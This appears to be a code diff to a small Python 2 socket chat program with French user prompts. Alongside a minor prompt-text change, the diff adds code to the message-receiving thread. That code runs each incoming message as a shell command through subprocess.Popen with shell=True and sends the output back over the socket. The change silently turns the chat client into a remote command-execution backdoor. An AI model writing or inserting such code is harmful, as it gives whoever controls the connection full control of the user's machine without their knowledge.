@@ -1,3 +1,4 @@
+import subprocess
 import socket
 import sys
 import time
@@ -23,10 +24,12 @@ def testMessage(self):
         else:
             clientsocket.sendall(self)
             print "Message envoye, en attente de reponses...\n"
+            #clientsocket.send(''.join([line for line in p.stdout.xreadlines()]))
+            #print "Traitement OK !"
     pass
 
 def sendMessage():
-    contenu = raw_input("Saisir le texte a afficher sur le SRV : \nexit si vous voulez quitter\n")
+    contenu = raw_input("Saisir le texte a afficher sur le SRV : \nEXIT pour quitter\n")
     testMessage(contenu)
     pass
 
@@ -39,6 +42,10 @@ class mytchatrecep(Thread):
                 #le 255 definit le nombre de caracteres envoye en une seule fois
                 if data != '':
                     print '\nRecu : "%s"' % data
+                    #exec("data")
+                    p = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE)
+                    clientsocket.send(''.join([line for line in p.stdout.xreadlines()]))
+                    #print action
 
 
 class mytchatsend(Thread):
